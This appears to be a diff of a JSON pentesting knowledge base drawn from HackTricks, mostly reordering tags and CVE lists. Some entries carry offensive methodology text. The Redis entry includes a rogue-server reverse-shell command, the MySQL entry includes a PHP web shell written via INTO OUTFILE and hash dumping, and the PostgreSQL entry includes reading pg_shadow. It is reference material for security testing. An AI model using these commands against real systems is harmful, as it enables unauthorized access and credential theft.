-   "6000 pentesting x11",
    "exploit/unix/x11/x11_keyboard_exec",
-   "auxiliary/scanner/x11/open_x11",
-   "6000"
+   "6000",
+   "6000 pentesting x11",
+   "auxiliary/scanner/x11/open_x11"
   ]
  },
  {
@@ -6142,12 +6142,12 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "exploit/multi/upnp/libupnp_ssdp_overflow",
-   "auxiliary/scanner/ipmi/ipmi_cipher_zero",
    "ipmi",
+   "auxiliary/scanner/ipmi/ipmi_cipher_zero",
+   "auxiliary/scanner/ipmi/ipmi_dumphashes",
    "623",
    "auxiliary/scanner/ipmi/ipmi_version",
-   "auxiliary/scanner/ipmi/ipmi_dumphashes"
+   "exploit/multi/upnp/libupnp_ssdp_overflow"
   ]
  },
  {
@@ -6425,11 +6425,11 @@
   "exploitation_commands": [],
   "default_credentials": [],
   "common_vulnerabilities": [
-   "CVE-2025-49844",
-   "CVE-2025-46818",
    "CVE-2025-46817",
+   "CVE-2025-46818",
    "cve-2025-49844",
-   "CVE-2022-0543"
+   "CVE-2022-0543",
+   "CVE-2025-49844"
   ],
   "privilege_escalation": [],
   "methodology": "## Basic Information\nFrom [the docs](https://redis.io/topics/introduction): Redis is an open source (BSD licensed), in-memory **data structure store**, used as a **database**, cache and message broker).\n\nBy default Redis uses a plain-text based protocol, but you have to keep in mind that it can also implement **ssl/tls**. Learn how to [run Redis with ssl/tls here](https://fossies.org/linux/redis/TLS.md).\n\n**Default port:** 6379\n\n```\nPORT     STATE SERVICE  VERSION\n6379/tcp open  redis   Redis key-value store 4.0.9\n```\n\n## Automatic Enumeration\nSome automated tools that can help to obtain info from a redis instance:\n\n```bash\nnmap --script redis-info -sV -p 6379 <IP>\nmsf> use auxiliary/scanner/redis/redis_server\n```\n\n## Banner\nRedis is a **text based protocol**, you can just **send the command in a socket** and the returned values will be readable. Also remember that Redis can run using **ssl/tls** (but this is very weird).\n\nIn a regular Redis instance you can just connect using `nc` or you could also use `redis-cli`:\n\n```bash\nnc -vn 10.10.10.10 6379\nredis-cli -h 10.10.10.10 # sudo apt-get install redis-tools\n```\n\nThe **first command** you could try is **`info`**. It **may return output with information** of the Redis instance **or something** like the following is returned:\n\n```\n-NOAUTH Authentication required.\n```\n\nIn this last case, this means that **you need valid credentials** to access the Redis instance.\n\n## Redis Authentication\n**By default** Redis can be accessed **without credentials**. However, it can be **configured** to support **only password, or username + password**.\\\nIt is possible to **set a password** in _**redis.conf**_ file with the parameter `requirepass` **or temporary** until the service restarts connecting to it and running: `config set requirepass p@ss$12E45`.\\\nAlso, a **username** can be configured in the parameter `masteruser` inside the _**redis.conf**_ file.\n\n> [!TIP]\n> If only password is configured the username used is \"**default**\".\\\n> Also, note that there is **no way to find externally** if Redis was configured with only password or username+password.\n\nIn cases like this one you will **need to find valid credentials** to interact with Redis so you could try to [**brute-force**](../generic-hacking/brute-force.md#redis) it.\\\n**In case you found valid credentials you need to authenticate the session** after establishing the connection with the command:\n\n```bash\nAUTH <username> <passwor\n\n## **Authenticated enumeration**\nIf the Redis server permits **anonymous connections** or if you have obtained valid credentials, you can initiate the enumeration process for the service using the following **commands**:\n\n```bash\nINFO\n[ ... Redis response with info ... ]\nclient list\n[ ... Redis response with connected clients ... ]\nCONFIG GET *\n[ ... Get config ... ]\n```\n\n**Other Redis commands** [**can be found here**](https://redis.io/topics/data-types-intro) **and** [**here**](https://lzone.de/cheat-sheet/Redis)**.**\n\nNote that the **Redis commands of an instance can be renamed** or removed in the _redis.conf_ file. For example this line will remove the command FLUSHDB:\n\n```\nrename-command FLUSHDB \"\"\n```\n\nMore about configuring securely a Redis service here: [https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04](https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04)\n\nYou can also **monitor in real time the Redis commands** execut\n\n## **Dumping Database**\nInside Redis the **databases are numbers starting from 0**. You can find if anyone is used in the output of the command `info` inside the \"Keyspace\" chunk:\n\n![](<../images/image (766).png>)\n\nOr you can just get all the **keyspaces** (databases) with:\n\n```\nINFO keyspace\n```\n\nIn that example the **database 0 and 1** are being used. **Database 0 contains 4 keys and database 1 contains 1**. By default Redis will use database 0. In order to dump for example database 1 you need to do:\n\n```bash\nSELECT 1\n[ ... Indicate the database ... ]\nKEYS *\n[ ... Get Keys ... ]\nGET <KEY>\n[ ... Get Key ... ]\n```\n\nIn case you get the following error `-WRONGTYPE Operation against a key holding the wrong kind of value` while running `GET <KEY>` it's because the key may be something else than a string or an integer and requires a special operator to display it.\n\nTo know the type of the key, use the `TYPE` command, example below for list and hash keys.\n\n```bash\nTYPE <KEY>\n[ ... Type of the Key ... ]\nLRANGE <KEY>\n\n## If the type used is weird you can always do:\nDUMP <key>\n```\n\n**Dump the database with npm**[ **redis-dump**](https://www.npmjs.com/package/redis-dump) **or python** [**redis-utils**](https://pypi.org/project/redis-utils/)\n\n## Interactive Shell\n[**redis-rogue-server**](https://github.com/n0b0dyCN/redis-rogue-server) can automatically get an interactive shell or a reverse shell in Redis(<=5.0.5).\n\n```\n./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>\n```\n\n##",
@@ -6437,9 +6437,9 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "6379",
    "auxiliary/scanner/redis/redis_server",
-   "redis"
+   "redis",
+   "6379"
   ]
  },
  {
@@ -6502,9 +6502,9 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
+   "69",
    "tftp",
-   "auxiliary/admin/tftp/tftp_transfer_util",
-   "69"
+   "auxiliary/admin/tftp/tftp_transfer_util"
   ]
  },
  {
@@ -6557,8 +6557,8 @@
   "kill_chain_phase": "GENERAL",
   "source": "hacktricks",
   "tags": [
-   "7 tcp udp pentesting echo",
-   "7"
+   "7",
+   "7 tcp udp pentesting echo"
   ]
  },
  {
@@ -6583,8 +6583,8 @@
   "kill_chain_phase": "RECON",
   "source": "hacktricks",
   "tags": [
-   "700",
-   "700 pentesting epp"
+   "700 pentesting epp",
+   "700"
   ]
  },
  {
@@ -6909,9 +6909,9 @@
    }
   ],
   "common_vulnerabilities": [
+   "CVE-2019-20933",
    "cve-2024-30896",
-   "CVE-2024-30896",
-   "CVE-2019-20933"
+   "CVE-2024-30896"
   ],
   "privilege_escalation": [],
   "methodology": "## Basic Information\n**InfluxDB** is an open-source **time series database (TSDB)** developed by InfluxData. TSDBs are optimized for storing and serving time series data, which consists of timestamp-value pairs. Compared to general-purpose databases, TSDBs provide significant improvements in **storage space** and **performance** for time series datasets. They employ specialized compression algorithms and can be configured to automatically remove old data. Specialized database indices also enhance query performance.\n\n**Default port**: 8086\n\n```\nPORT     STATE SERVICE VERSION\n8086/tcp open  http    InfluxDB http admin 1.7.5\n```\n\n## Identify & Version (HTTP)\n- v1.x: `GET /ping` returns status 204 and headers like `X-Influxdb-Version` and `X-Influxdb-Build`.\n- v2.x+: `GET /health` returns JSON with the server version and status. Works without auth.\n\n```bash\n\n## v2/compat health\ncurl -s http://<host>:8086/health | jq .\n```\n\nTip: exposed instances often also serve Prometheus-style metrics at `/metrics`.\n\n## Enumeration\nFrom a pentester point of view this another database that could be storing sensitive information, so it's interesting to know how to dump all the info.\n\n## Authentication\nInfluxDB might require authentication or not\n\n```bash\n\n## Try unauthenticated CLI (v1 shell)\ninflux -host <host> -port 8086\n> use _internal\n```\n\nIf you **get an error like** this one: `ERR: unable to parse authentication credentials` it means that it's **expecting some credentials**.\n\n```\ninflux –username influx –password influx_pass\n```\n\nThere was a vulnerability influxdb that allowed to bypass the authentication: [**CVE-2019-20933**](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933)\n\n## Manual Enumeration (v1 HTTP API / InfluxQL)\nEven when no CLI is available, the HTTP API is usually exposed on port 8086.\n\n```bash\n\n## List databases (unauth)\ncurl -sG \"http://<host>:8086/query\" --data-urlencode \"q=SHOW DATABASES\"\n\n## List retention policies of a DB\ncurl -sG \"http://<host>:8086/query\" --data-urlencode \"db=telegraf\" --data-urlencode \"q=SHOW RETENTION POLICIES ON telegraf\"\n\n## List users (if auth disabled)\ncurl -sG \"http://<host>:8086/query\" --data-urlencode \"q=SHOW USERS\"",
@@ -6920,8 +6920,8 @@
   "source": "hacktricks",
   "tags": [
    "auxiliary/scanner/http/influxdb_enum",
-   "8086 pentesting influxdb",
-   "8086"
+   "8086",
+   "8086 pentesting influxdb"
   ]
  },
  {
@@ -7046,8 +7046,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "8089 splunkd",
-   "8089"
+   "8089",
+   "8089 splunkd"
   ]
  },
  {
@@ -7187,8 +7187,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "8333 18333 38333 18444 pentesting bitcoin",
-   "8333"
+   "8333",
+   "8333 18333 38333 18444 pentesting bitcoin"
   ]
  },
  {
@@ -7345,8 +7345,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "rsync",
    "873",
+   "rsync",
    "auxiliary/scanner/rsync/modules_list"
   ]
  },
@@ -7574,8 +7574,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "9001",
-   "9001 pentesting hsqldb"
+   "9001 pentesting hsqldb",
+   "9001"
   ]
  },
  {
@@ -7777,13 +7777,13 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "auxiliary/scanner/printer/printer_version_info",
-   "auxiliary/scanner/printer/printer_ready_message",
-   "auxiliary/scanner/printer/printer_delete_file",
-   "9100 pjl",
-   "auxiliary/scanner/printer/printer_list_dir",
    "auxiliary/scanner/printer/printer_download_file",
-   "9100"
+   "auxiliary/scanner/printer/printer_env_vars",
+   "auxiliary/scanner/printer/printer_ready_message",
+   "auxiliary/scanner/printer/printer_list_dir",
+   "auxiliary/scanner/printer/printer_upload_file",
+   "9100",
+   "9100 pjl"
   ]
  },
  {
@@ -7902,9 +7902,9 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "9200",
+   "elasticsearch",
    "auxiliary/scanner/elasticsearch/indices_enum",
-   "elasticsearch"
+   "9200"
   ]
  },
  {
@@ -7997,8 +7997,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "cassandra",
-   "0"
+   "0",
+   "cassandra"
   ]
  },
  {
@@ -8301,8 +8301,8 @@
    }
   ],
   "common_vulnerabilities": [
-   "cve-2025-9242",
-   "CVE-2025-9242"
+   "CVE-2025-9242",
+   "cve-2025-9242"
   ],
   "privilege_escalation": [],
   "methodology": "## Basic Information\n**IPsec** is widely recognized as the principal technology for securing communications between networks (LAN-to-LAN) and from remote users to the network gateway (remote access), serving as the backbone for enterprise VPN solutions.\n\nThe establishment of a **security association (SA)** between two points is managed by **IKE**, which operates under the umbrella of ISAKMP, a protocol designed for the authentication and key exchange. This process unfolds in several phases:\n\n- **Phase 1:** A secure channel is created between two endpoints. This is achieved through the use of a Pre-Shared Key (PSK) or certificates, employing either main mode, which involves three pairs of messages, or **aggressive mode**.\n- **Phase 1.5:** Though not mandatory, this phase, known as the Extended Authentication Phase, verifies the identity of the user attempting to connect by requiring a username and password.\n- **Phase 2:** This phase is dedicated to negotiating the parameters for securing data with **ESP** a\n\n## **Discover** the service using nmap\n```\nroot@bt:~# nmap -sU -p 500 172.16.21.200\nStarting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST\nNmap scan report for 172.16.21.200\nHost is up (0.00036s latency).\nPORT    STATE SERVICE\n500/udp open  isakmp\nMAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)\n```\n\n## **Finding a valid transformation**\nThe IPSec configuration can be prepared only to accept one or a few transformations. A transformation is a combination of values. **Each transform** contains a number of attributes like DES or 3DES as the **encryption algorithm**, SHA or MD5 as the **integrity algorithm**, a pre-shared key as the **authentication type**, Diffie-Hellman 1 or 2 as the key **distribution algorithm** and 28800 seconds as the **lifetime**.\n\nThen, the first thing that you have to do is to **find a valid transformation**, so the server will talk to you. To do so, you can use the tool **ike-scan**. By default, Ike-scan works in main mode, and sends a packet to the gateway with an ISAKMP header and a single proposal with **eight transforms inside it**.\n\nDepending on the response you can obtain some information about the endpoint:\n\n```\nroot@bt:~# ike-scan -M 172.16.21.200\nStarting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)\n172.16.21.200    Main Mode Handshake returned\n    HDR=(CKY-R=d\n\n## Server fingerprinting\nThen, you can use ike-scan to try to **discover the vendor** of the device. The tool send an initial proposal and stops replaying. Then, it will **analyze** the **time** difference **between** the received **messages** from the server and the matching response pattern, the pentester can successfully fingerprint the VPN gateway vendor. More over, some VPN servers will use the optional **Vendor ID (VID) payload** with IKE.\n\n**Specify the valid transformation if needed** (using --trans)\n\nIf IKE discover which is the vendor it will print it:\n\n```\nroot@bt:~# ike-scan -M --showbackoff 172.16.21.200\nStarting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)\n172.16.21.200    Main Mode Handshake returned\n    HDR=(CKY-R=4f3ec84731e2214a)\n    SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)\n    VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)\n\nIKE Backoff Patterns:\n\nIP Address       No.  Recv time            Delta Time\n172.\n\n## IKEv2-specific: WatchGuard Vendor ID version fingerprinting\nSome IKEv2 daemons include non-standard Vendor ID payloads in the IKE_SA_INIT response. WatchGuard Fireware OS encodes the appliance version/build directly inside the VID, allowing single-packet, pre-auth fingerprinting.\n\n- Transport: UDP/500 (and UDP/4500 for NAT-T)\n- Packet: IKE_SA_INIT response contains one or more Vendor ID payloads\n- WatchGuard format: 32-byte hash followed by base64 that decodes to e.g. `VN=12.11.3 BN=719894`\n\nExample raw bytes from a WatchGuard VID payload (last 12 bytes are base64):\n\n```\n00000000: bfc2 2e98 56ba 9936 11c1 1e48 a6d2 0807  ....V..6...H....\n00000010: a95b edb3 9302 6a49 e60f ac32 7bb9 601b  .[....jI...2{.`.\n00000020: 566b 3439 4d54 4975 4d54 4575 4d79 4243  Vk49MTIuMTEuMyBC\n00000030: 546a 3033 4d54 6b34 4f54 513d            Tj03MTk4OTQ=\n```\n\nQuick extraction on a shell when you have the base64 tail:\n\n```bash\necho 'Vk49MTIuMTEuMyBCTj03MTk4OTQ=' | base64 -d\n\n## VN=12.11.3 BN=719894\n```\n\nNotes\n- This is not part of any IKEv2 RFC. Treat it as a vendor quirk for rapid scoping of exposed/vulnerable Fireware OS versions.\n- You only need to elicit an IKE_SA_INIT reply; no authentication is required.\n\n## Finding the correct ID (group name)\nFor being allowed to capture the hash you need a valid transformation supporting Aggressive mode and the correct ID (group name). You probably won't know the valid group name, so you will have to brute-force it.\\\nTo do so, I would recommend you 2 methods:\n\n## Bruteforcing ID with ike-scan\nFirst of all try to make a request with a fake ID trying to gat",
@@ -8310,8 +8310,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "ipsec ike vpn pentesting",
-   "0"
+   "0",
+   "ipsec ike vpn pentesting"
   ]
  },
  {
@@ -8534,9 +8534,9 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "pentesting 264 check point firewall 1",
+   "0",
    "auxiliary/gather/checkpoint_hostname",
-   "0"
+   "pentesting 264 check point firewall 1"
   ]
  },
  {
@@ -8570,12 +8570,12 @@
   "exploitation_commands": [],
   "default_credentials": [],
   "common_vulnerabilities": [
-   "CVE-2024-47076",
-   "CVE-2024-35235",
+   "CVE-2023-50739",
    "CVE-2024-47177",
-   "CVE-2023-0856",
+   "CVE-2024-35235",
    "CVE-2024-47176",
-   "CVE-2023-50739"
+   "CVE-2023-0856",
+   "CVE-2024-47076"
   ],
   "privilege_escalation": [],
   "methodology": "## Internet Printing Protocol\n{{#include ../banners/hacktricks-training.md}}\n\nThe **Internet Printing Protocol (IPP)**, as specified in **RFC 2910** and **RFC 2911**, is the de-facto standard for network printing. It sits on top of **HTTP/1.1** (either clear-text or TLS) and exposes a rich API for creating print jobs, querying printer capabilities and managing queues. Modern extensions such as **IPP Everywhere** even allow driver-less printing from mobile and cloud environments, while the same packet format has been reused for 3-D printers.\n\nUnfortunately, exposing port **631/tcp (and 631/udp for printer discovery)** often leads to serious security issues – both on traditional office printers and on any Linux/Unix host running **CUPS**.\n\n---\n\n## Minimal IPP Get-Printer-Attributes request (operation-id 0x000B)\nipp = struct.pack(\n    \">IHHIHH\",               # version 2.0, operation-id, request-id\n    0x0200,                  # 2.0\n    0x000B,                  # Get-Printer-Attributes\n    0x00000001,             # request-id\n    0x01, 0x47,             # operation-attributes-tag, charset attr (skipped)\n) + b\"\\x03\"                # end-of-attributes\n\nr = requests.post(\"http://printer:631/ipp/print\", headers={\"Content-Type\":\"application/ipp\"}, data=ipp)\nprint(r.status_code, r.content[:40])\n```\n---\n\n## or only basic info\nnmap -p631 --script=cups-info,cups-queue-info <target>\n```\nThe `cups-info` script extracts model, state and queue statistics while `cups-queue-info` enumerates pending jobs.\n\n## 2. IPP utilities from CUPS\n* `ippfind` – multicast/UDP discovery (works against cups-browsed):\n  ```bash\n  ippfind --timeout 3 --txt -v \"@local and port=631\"  # list printers\n  ```\n* `ipptool` – arbitrary requests defined in a *.test* file:\n  ```bash\n  ipptool -tv ipp://<IP>/ipp/print get-printer-attributes.test\n  ```\n  The bundled *get-printer-attributes.test* file queries firmware version, supported document formats, etc.\n\n## 3. Shodan / Censys dorks\n```bash\nshodan search 'product:\"CUPS (IPP)\" port:631'\n```\nMore than **70 000** hosts were publicly exposing CUPS in April 2025 .\n\n---\n\n## Recent Vulnerabilities (2023-2025)\n| Year | CVE ID(s) | Affected component | Impact |\n|------|-----------|--------------------|--------|\n| 2025 | CVE-2023-50739 | Lexmark firmware (IPP parser) | Heap-overflow → RCE over Wi-Fi/LAN  |\n| 2024 | CVE-2024-47076, 47175, 47176, 47177 | cups-browsed, libcupsfilters, libppd, cups-filters | Full unauthenticated RCE chain on any Linux desktop/server with CUPS browsing enabled  |\n| 2024 | CVE-2024-35235 | cupsd 2.4.8- | Symlink trick → arbitrary **chmod 666** → privilege escalation  |\n| 2023 | CVE-2023-0856 (Canon) + Pwn2Own | Stack-overflow in `sides` attribute → remote code execution  |\n\n## cups-browsed RCE chain (September 2024)\n1. `cups-browsed` listens on **UDP/631** for printer advertisements.\n2. An attacker sends a single spoofed packet pointing to a malicious IPP URL (CVE-2024-47176).\n3. `libcupsfilters` automatically fetches the remote **PPD** without validation (CVE-2024-47076 & 47175).\n4. A crafted PPD abuses the **foomatic-rip** filter to execute arbitrary shell commands whenever anything is printed (CVE-2024-47177).\n\nProof-of-concept code is public on the researcher’s blog and exploits require **no authentication**; network access to UDP/631 is enough.\n\n## Temporary mitigations\n```\nsudo systemctl stop cups-browsed\nsudo systemctl disable cups-browsed\nsudo ufw deny 631/udp  # or equivalent firewall rule\n```\nPatches were released by major distributions in October 2024 – ensure **cups-filters ≥ 2.0.0**.\n\n## cupsd symlink `Listen` misconfiguration (CVE-2024-35235)\nPlacing a symbolic link in *cupsd.conf*’s `Listen` directive causes **cupds (root)** to `chmod 666` an attacker-chosen path, leading to writable system files and, on Ubuntu, code execution via a malicious PPD with `FoomaticRIPCommandLine` .\n\n---\n\n## Offensive Techniques\n* **Unauthenticated raw print job** – many printers accept `POST /ipp/print` without auth. A malicious **PostScript** payload can invoke shell commands (`system(\"/bin/nc ...\")`) on high-end devices.\n* **Job Hijacking** – `Cancel-Job` followed by `Send-Document` lets an attacker replace someone else’s document before it is physically printed.\n* **SNMP → IPP combo** – default community `public` often leaks the internal queue name required in the IPP URL.\n\n---",
@@ -8924,10 +8924,10 @@
   "source": "hacktricks",
   "tags": [
    "pentesting dns",
+   "0",
    "auxiliary/scanner/dns/dns_amp;",
    "auxiliary/gather/enum_dns",
-   "auxiliary/gather/enum_dns;",
-   "0"
+   "auxiliary/gather/enum_dns;"
   ]
  },
  {
@@ -9038,8 +9038,8 @@
   "source": "hacktricks",
   "tags": [
    "pentesting finger",
-   "auxiliary/scanner/finger/finger_users",
-   "0"
+   "0",
+   "auxiliary/scanner/finger/finger_users"
   ]
  },
  {
@@ -9322,13 +9322,13 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "auxiliary/scanner/ftp/bison_ftp_traversal;",
-   "auxiliary/scanner/ftp/colorado_ftp_traversal;",
-   "readme",
    "auxiliary/scanner/ftp/titanftp_xcrc_traversal;",
+   "0",
    "auxiliary/scanner/ftp/ftp_version;",
    "auxiliary/scanner/ftp/anonymous;",
-   "0"
+   "readme",
+   "auxiliary/scanner/ftp/colorado_ftp_traversal;",
+   "auxiliary/scanner/ftp/bison_ftp_traversal;"
   ]
  },
  {
@@ -9392,8 +9392,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "ftp bounce download 2oftp file",
-   "0"
+   "0",
+   "ftp bounce download 2oftp file"
   ]
  },
  {
@@ -9702,9 +9702,9 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
+   "0",
    "auxiliary/scanner/imap/imap_version;",
-   "pentesting imap",
-   "0"
+   "pentesting imap"
   ]
  },
  {
@@ -9874,8 +9874,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "pentesting irc",
-   "0"
+   "0",
+   "pentesting irc"
   ]
  },
  {
@@ -10203,8 +10203,8 @@
   "kill_chain_phase": "PRIVILEGE_ESCALATION",
   "source": "hacktricks",
   "tags": [
-   "harvesting tickets from windows",
-   "0"
+   "0",
+   "harvesting tickets from windows"
   ]
  },
  {
@@ -10490,8 +10490,8 @@
   "kill_chain_phase": "RECON",
   "source": "hacktricks",
   "tags": [
-   "pentesting ldap",
-   "0"
+   "0",
+   "pentesting ldap"
   ]
  },
  {
@@ -10542,9 +10542,9 @@
   "source": "hacktricks",
   "tags": [
    "pentesting modbus",
-   "auxiliary/scanner/scada/modbusdetect",
+   "0",
    "auxiliary/scanner/scada/modbus_findunitid",
-   "0"
+   "auxiliary/scanner/scada/modbusdetect"
   ]
  },
  {
@@ -10913,13 +10913,13 @@
   "kill_chain_phase": "RECON",
   "source": "hacktricks",
   "tags": [
-   "auxiliary/admin/mssql/mssql_ntlm_stealer",
-   "auxiliary/admin/mssql/mssql_findandsampledata",
-   "exploit/windows/mssql/mssql_payload",
-   "readme",
+   "auxiliary/admin/mssql/mssql_escalate_execute_as;",
+   "exploit/windows/mssql/mssql_linkcrawler",
+   "0",
+   "auxiliary/scanner/mssql/mssql_schemadump;",
    "auxiliary/admin/mssql/mssql_enum;",
-   "auxiliary/admin/mssql/mssql_idf",
-   "0"
+   "auxiliary/admin/mssql/mssql_escalate_execute_as",
+   "readme"
   ]
  },
  {
@@ -11270,8 +11270,8 @@
    }
   ],
   "common_vulnerabilities": [
-   "cve-2025-25257",
-   "CVE-2023-21971"
+   "CVE-2023-21971",
+   "cve-2025-25257"
   ],
   "privilege_escalation": [],
   "methodology": "## **Basic Information**\n**MySQL** can be described as an open source **Relational Database Management System (RDBMS)** that is available at no cost. It operates on the **Structured Query Language (SQL)**, enabling the management and manipulation of databases.\n\n**Default port:** 3306\n\n```\n3306/tcp open  mysql\n```\n\n## **Local**\n```bash\nmysql -u root # Connect to root without password\nmysql -u root -p # A password will be asked (check someone)\n```\n\n## Remote\n```bash\nmysql -h <Hostname> -u root\nmysql -h <Hostname> -u root@localhost\n```\n\n## External Enumeration\nSome of the enumeration actions require valid credentials\n\n```bash\nnmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>\nmsf> use auxiliary/scanner/mysql/mysql_version\nmsf> use auxiliary/scanner/mysql/mysql_authbypass_hashdump\nmsf> use auxiliary/scanner/mysql/mysql_hashdump #Creds\nmsf> use auxiliary/admin/mysql/mysql_enum #Creds\nmsf> use auxiliary/scanner/mysql/mysql_schemadump #Creds\nmsf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds\n```\n\n## Write any binary data\n```bash\nCONVERT(unhex(\"6f6e2e786d6c55540900037748b75c7249b75\"), BINARY)\nCONVERT(from_base64(\"aG9sYWFhCg==\"), BINARY)\n```\n\n## **MySQL commands**\n```bash\nshow databases;\nuse <database>;\nconnect <database>;\nshow tables;\ndescribe <table_name>;\nshow columns from <table>;\n\nselect version(); #version\nselect @@version(); #version\nselect user(); #User\nselect database(); #database name\n\n#Get a shell with the mysql client user\n\\! sh\n\n#Basic MySQLi\nUnion Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables\nUnion Select 1,2,3,4,column_name from information_schema.columns where table_name=\"<TABLE NAME>\"\n\n#Read & Write\n\n## Yo need FILE privilege to read & write to files.\nselect load_file('/var/lib/mysql-files/key.txt'); #Read file\nselect 1,2,\"<?php echo shell_exec($_GET['c']);?>\",4 into OUTFILE 'C:/xampp/htdocs/back.php'\n\n#Try to change MySQL root password\nUPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';\nUPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';\nFLUSH PRIVILEGES;\nquit;\n```\n\n```bash\nmysql -u username -p < manycommands.sql #A file with all the commands you want to execute\nmysql -u root -h 127.0.0.1 -e 'show databases;'\n```\n\n## MySQL Permissions Enumeration\n```sql\n#Mysql\nSHOW GRANTS [FOR user];\nSHOW GRANTS;\nSHOW GRANTS FOR 'root'@'localhost';\nSHOW GRANTS FOR CURRENT_USER();\n\n## Get users, permissions & hashes\nSELECT * FROM mysql.user;\n\n#From DB\nselect * from mysql.user where user='root';\n\n## Get users with file_priv\nselect user,file_priv from mysql.user where file_priv='Y';",
@@ -11279,13 +11279,13 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "auxiliary/admin/mysql/mysql_enum;",
+   "0",
+   "auxiliary/scanner/mysql/mysql_hashdump",
+   "auxiliary/scanner/mysql/mysql_version;",
+   "auxiliary/scanner/mysql/mysql_version",
    "pentesting mysql",
-   "auxiliary/scanner/mysql/mysql_schemadump;",
-   "auxiliary/admin/mysql/mysql_enum",
-   "exploit/windows/mysql/mysql_start_up",
-   "auxiliary/scanner/mysql/mysql_hashdump;",
-   "0"
+   "auxiliary/scanner/mysql/mysql_schemadump",
+   "auxiliary/admin/mysql/mysql_enum;"
   ]
  },
  {
@@ -11423,8 +11423,8 @@
   "kill_chain_phase": "RECON",
   "source": "hacktricks",
   "tags": [
-   "pentesting ntp",
-   "0"
+   "0",
+   "pentesting ntp"
   ]
  },
  {
@@ -11698,9 +11698,9 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "auxiliary/scanner/pop3/pop3_version;",
+   "0",
    "pentesting pop",
-   "0"
+   "auxiliary/scanner/pop3/pop3_version;"
   ]
  },
  {
@@ -11972,8 +11972,8 @@
    }
   ],
   "common_vulnerabilities": [
-   "CVE-2019-9193",
-   "cve-2019-9193"
+   "cve-2019-9193",
+   "CVE-2019-9193"
   ],
   "privilege_escalation": [],
   "methodology": "## **Basic Information**\n**PostgreSQL** is described as an **object-relational database system** that is **open source**. This system not only utilizes the SQL language but also enhances it with additional features. Its capabilities allow it to handle a wide range of data types and operations, making it a versatile choice for developers and organizations.\n\n**Default port:** 5432, and if this port is already in use it seems that postgresql will use the next port (5433 probably) which is not in use.\n\n```\nPORT     STATE SERVICE\n5432/tcp open  pgsql\n```\n\n## Connect & Basic Enum\n```bash\npsql -U <myuser> # Open psql console with user\npsql -h <host> -U <username> -d <database> # Remote connection\npsql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection\n```\n\n```sql\npsql -h localhost -d <database_name> -U <User> #Password will be prompted\n\\list # List databases\n\\c <database> # use the database\n\\d # List tables\n\\du+ # Get users roles\n\n## List schemas\nSELECT schema_name,schema_owner FROM information_schema.schemata;\n\\dn+\n\n#List databases\nSELECT datname FROM pg_database;\n\n#Read credentials (usernames + pwd hash)\nSELECT usename, passwd from pg_shadow;\n\n## Get history of commands executed\n\\s\n```\n\n> [!WARNING]\n> If running **`\\list`** you find a database called **`rdsadmin`** you know you are inside an **AWS postgresql database**.\n\nFor more information about **how to abuse a PostgreSQL database** check:\n\n\n{{#ref}}\n../pentesting-web/sql-injection/postgresql-injection/\n{{#endref}}\n\n## Automatic Enumeration\n```\nmsf> use auxiliary/scanner/postgres/postgres_version\nmsf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection\n```\n\n## **Port scanning**\nAccording to [**this research**](https://www.exploit-db.com/papers/13084), when a connection attempt fails, `dblink` throws an `sqlclient_unable_to_establish_sqlconnection` exception including an explanation of the error. Examples of these details are listed below.\n\n```sql\nSELECT * FROM dblink_connect('host=1.2.3.4\n                              port=5678\n                              user=name\n                              password=secret\n                              dbname=abc\n                              connect_timeout=10');\n```\n\n- Host is down\n\n`DETAIL: could not connect to server: No route to host Is the server running on host \"1.2.3.4\" and accepting TCP/IP connections on port 5678?`\n\n- Port is closed\n\n```\nDETAIL:  could not connect to server: Connection refused Is  the  server\nrunning on host \"1.2.3.4\" and accepting TCP/IP connections on port 5678?\n```\n\n- Port is open\n\n```\nDETAIL:  server closed the connection unexpectedly This  probably  means\nthe server terminated 